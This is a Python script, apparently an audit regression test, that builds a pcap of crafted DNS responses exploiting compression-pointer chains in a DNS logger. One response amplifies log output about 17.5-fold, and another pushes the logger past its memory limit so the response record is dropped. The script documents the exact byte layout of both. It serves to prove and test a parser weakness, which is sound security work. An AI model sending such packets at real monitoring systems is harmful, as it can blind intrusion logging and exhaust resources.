#!/usr/bin/env python3
"""Generate the worst-case DNS name-compression pcap for the EVE DNS
logger amplification proof.

This is the re-audit #4 follow-up test: it proves that the *parser*,
not the wire message, is the amplification source in the DNS logger.

Design
======
One UDP flow, two transactions:

1. Main txn (id 0x1234): one CNAME answer whose rrname is a 16-pointer
   compression chain. Each pointer hops 66 bytes forward; the chain
   ends in a 1-NUL label followed by a natural 0x00 terminator. The
   resolved name is EXACTLY 1025 bytes (1009 NUL + 16 dots) -- the
   parser's MAX_NAME_LEN boundary, reached *without* exceeding it --
   so no TRUNCATED flag is set and the schema has nothing to complain
   about. The CNAME rdata is a 2-byte pointer back to the chain head:
   same 1025-byte name, again.

   CRITICAL LAYOUT CONSTRAINT (parser semantics): dns_parse_name()
   returns the input position after the FIRST pointer it followed.
   In DNS wire format the bytes at the pointer target are part of the
   name content, not the record field sequence -- so the answer's
   rrtype/class/ttl/rdlen/rdata fields sit IMMEDIATELY AFTER the first
   2-byte pointer, and the chain continuation comes after those
   fields. Putting the fields after the terminator (the naive layout)
   makes the parser read rrtype/ttl/rdlen from inside the NUL chain.

   Wire answer layout (main txn response, 1100-byte DNS message):
       12..24   qname  example.com.  (plain, no compression)
       25..28   qtype A, qclass IN
       29..92   L1: len=0x3F + 63 NUL
       93..94   PTR -> 107          (first pointer of the chain)
       95..96   rtype CNAME         <- parser continues HERE
       97..98   class IN
       99..102  ttl 300
       103..104 rdlen 2
       105..106 rdata = PTR -> 29   (chain head: same 1025-byte name)
       107..1096  L2..L16: each len=0x3F + 63 NUL + PTR -> start+66
       1097..1099 L17: len=0x01 + 1 NUL + 0x00 terminator

   16 x 63 + 1 x 1 NUL label bytes + 16 dots = exactly 1025.
   The 1025-byte name is logged THREE times (answers[0].rrname,
   answers[0].rdata, grouped.CNAME[0]) -> 3027 literal \u0000 escapes.
   1100-byte wire message -> ~19.2 KB eve line (17.5x per event).

2. Drop-hammer txn (id 0x5678): the response's OWN question section
   carries the 1025-byte compression chain (qname: L1 at 12..75, first
   pointer 76..77 -> 82, qtype/qclass at 78..81, continuation 82..1074,
   answers start at 1075). 4601 CNAME answers follow, each
   [PTR->12][CNAME][IN][ttl][rdlen=2][PTR->12] = 14 wire bytes, with
   BOTH name fields a 2-byte BACKWARD pointer to the chain head --
   standard, spec-legal compression (pointers to an earlier part of
   the message). Each answer resolves the 1025-byte name three times
   (rrname + rdata + grouped) -> ~84 MB escaped, far beyond the 10 MiB
   MAX_LIMIT -> the whole response record is DROPPED (query event
   logged, response event absent, "Mem buffer asked to create" warning
   emitted).

   1075 + 4601 x 14 = 65489-byte DNS message < 64 KiB protocol limit
   -- valid on the wire, fatal in the logger.

All bytes are deterministic; the committed pcap regenerates
byte-for-byte. Only the stdlib is used; the IP/UDP checksums are
computed by hand.

Expected parser behavior (rust/src/dns/parser.rs):
  dns_parse_name: MAX_NAME_LEN = 1025 (parser.rs:31); pointer
  following with per-name 255-iteration limit; the name is built with
  a '.' between labels and logged via set_string_from_bytes, where
  each 0x00 byte becomes a 6-char \u0000 escape (6x per byte).
  log.rs:395: answers[i].rrname (resolved), log.rs:408: CNAME rdata,
  log.rs:489: grouped.CNAME[i] -- three full copies of the 1025-byte
  name per answer.
"""

import struct

OUT = "dns.pcap"

E1 = bytes.fromhex("024200000001")
E2 = bytes.fromhex("024200000002")

NUL = b"\x00"
QNAME = b"\x07example\x03com\x00"

CHAIN_HEAD = 29      # rrname start in the main response
L1_END_PTR = 93      # first pointer (2 bytes) after the L1 label
FIELDS_START = 95    # rrtype/class/ttl/rdlen/rdata live here
CHAIN_CONT = 107     # chain continuation starts here
L17_START = 1097     # final 1-byte label + terminator
MSG_LEN = 1100

# 16 x 63 NUL + 1 x 1 NUL + 16 dots = exactly 1025 (MAX_NAME_LEN)
RESOLVED = (b"\x00" * 63 + b".") * 16 + b"\x00"
assert len(RESOLVED) == 1025
assert RESOLVED.count(b"\x00") == 1009

HAMMER_ID = 0x5678
N_ANSWERS = 4601


def ptr(offset: int) -> bytes:
    assert offset < 0x4000
    return (0xC000 | offset).to_bytes(2, "big")


def chain_continuation() -> bytes:
    """L2..L16 (each 66 B, pointing to the next) + L17 + terminator."""
    out = bytearray()
    for i in range(15):
        start = CHAIN_CONT + i * 66
        out += bytes([0x3F]) + bytes(63) + ptr(start + 66)
    out += bytes([0x01]) + bytes(1) + bytes([0x00])
    return bytes(out)


def main_response() -> bytes:
    hdr = (0x1234).to_bytes(2, "big") + (0x8180).to_bytes(2, "big") \
        + (1).to_bytes(2, "big") + (1).to_bytes(2, "big") + bytes(4)
    q = QNAME + (1).to_bytes(2, "big") + (1).to_bytes(2, "big")
    # rrname: L1 (64 B) + first pointer -> CHAIN_CONT
    l1 = bytes([0x3F]) + bytes(63) + ptr(CHAIN_CONT)
    # answer fields: rtype CNAME, class IN, ttl 300, rdlen 2, rdata PTR
    fields = (5).to_bytes(2, "big") + (1).to_bytes(2, "big") \
        + (300).to_bytes(4, "big") + (2).to_bytes(2, "big") + ptr(CHAIN_HEAD)
    msg = hdr + q + l1 + fields + chain_continuation()
    assert len(msg) == MSG_LEN, len(msg)
    # sanity: field positions
    assert msg[FIELDS_START:FIELDS_START + 2] == (5).to_bytes(2, "big")
    assert msg[105:107] == ptr(CHAIN_HEAD)
    assert msg[L17_START:L17_START + 3] == b"\x01\x00\x00"
    return msg


# --- drop-hammer geometry (chain lives in the question section) -------
HQ_HEAD = 12        # qname start in the hammer response
HQ_L1_PTR = 76      # first pointer after the L1 label (12..75)
HQ_FIELDS = 78      # qtype/qclass live here (parser resumes after PTR)
HQ_CONT = 82        # chain continuation starts here
HQ_L17 = 82 + 15 * 66   # = 1006? no: L2..L16 at 82+i*66 (i=0..14)
HQ_ANSWERS = 1075   # answers start after the chain (1072..1074 = L17)


def hammer_chain_continuation() -> bytes:
    out = bytearray()
    for i in range(15):
        start = HQ_CONT + i * 66
        out += bytes([0x3F]) + bytes(63) + ptr(start + 66)
    out += bytes([0x01]) + bytes(1) + bytes([0x00])
    return bytes(out)


def hammer_response() -> bytes:
    hdr = HAMMER_ID.to_bytes(2, "big") + (0x8180).to_bytes(2, "big") \
        + (1).to_bytes(2, "big") + N_ANSWERS.to_bytes(2, "big") + bytes(4)
    # qname = chain: L1 + PTR -> HQ_CONT, qtype A, qclass IN
    q_l1 = bytes([0x3F]) + bytes(63) + ptr(HQ_CONT)
    q_fields = (1).to_bytes(2, "big") + (1).to_bytes(2, "big")
    cont = hammer_chain_continuation()
    # 4601 answers: each [PTR->HQ_HEAD][CNAME][IN][ttl][rdlen=2][PTR->HQ_HEAD]
    ans = ptr(HQ_HEAD) + (5).to_bytes(2, "big") + (1).to_bytes(2, "big") \
        + (300).to_bytes(4, "big") + (2).to_bytes(2, "big") + ptr(HQ_HEAD)
    assert len(ans) == 14
    msg = hdr + q_l1 + q_fields + cont + ans * N_ANSWERS
    # geometry checks
    assert HQ_ANSWERS == 12 + 64 + 2 + 4 + len(cont)
    assert len(msg) == HQ_ANSWERS + N_ANSWERS * 14
    assert len(msg) < 65536
    assert msg[HQ_ANSWERS:HQ_ANSWERS + 2] == ptr(HQ_HEAD)
    return msg


def query_message(txid: int) -> bytes:
    hdr = txid.to_bytes(2, "big") + (0x0100).to_bytes(2, "big") \
        + (1).to_bytes(2, "big") + bytes(6)
    assert len(hdr) == 12
    return hdr + QNAME + (1).to_bytes(2, "big") + (1).to_bytes(2, "big")





def ip_udp(src: str, dst: str, sport: int, dport: int, payload: bytes,
           iid: int) -> bytes:
    iph = bytes([0x45, 0x00]) + (len(payload) + 28).to_bytes(2, "big") \
        + iid.to_bytes(2, "big") + (0x4000).to_bytes(2, "big") \
        + bytes([64, 17, 0, 0]) \
        + bytes(map(int, src.split("."))) + bytes(map(int, dst.split(".")))
    s = sum(struct.unpack(">%dH" % (len(iph) // 2), iph))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    iph = iph[:10] + ((~s) & 0xFFFF).to_bytes(2, "big") + iph[12:]
    uh = sport.to_bytes(2, "big") + dport.to_bytes(2, "big") \
        + (len(payload) + 8).to_bytes(2, "big") + bytes(2)
    pseudo = iph[12:16] + iph[16:20] + bytes([0, 17]) \
        + (len(uh) + len(payload)).to_bytes(2, "big")
    data = pseudo + uh + payload
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack(">%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    csum = (~s) & 0xFFFF or 0xFFFF
    return iph + uh[:6] + csum.to_bytes(2, "big") + payload


def frame(et: bytes, es: bytes, payload: bytes) -> bytes:
    return et + es + (0x0800).to_bytes(2, "big") + payload


def main():
    q1 = frame(E2, E1, ip_udp("10.0.0.1", "10.0.0.2", 53440, 53,
                              query_message(0x1234), 1))
    r1 = frame(E1, E2, ip_udp("10.0.0.2", "10.0.0.1", 53, 53440,
                              main_response(), 2))
    q2 = frame(E2, E1, ip_udp("10.0.0.1", "10.0.0.2", 53440, 53,
                              query_message(HAMMER_ID), 3))
    r2 = frame(E1, E2, ip_udp("10.0.0.2", "10.0.0.1", 53, 53440,
                              hammer_response(), 4))

    out = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 0, 0, 0, 0xFFFF, 1)
    for ts, f in ((0, q1), (318000, r1), (600000, q2), (918000, r2)):
        out += struct.pack("<IIII", ts // 10 ** 6, ts % 10 ** 6,
                           len(f), len(f)) + f
    with open(OUT, "wb") as fh:
        fh.write(out)
    print("wrote %s: %d bytes, 4 frames" % (OUT, len(out)))
    print("main response DNS message: %d bytes; resolved name: %d bytes"
          % (MSG_LEN, len(RESOLVED)))
    print("hammer DNS message: %d bytes, %d answers"
          % (HQ_ANSWERS + N_ANSWERS * 14, N_ANSWERS))


if __name__ == "__main__":
    main()
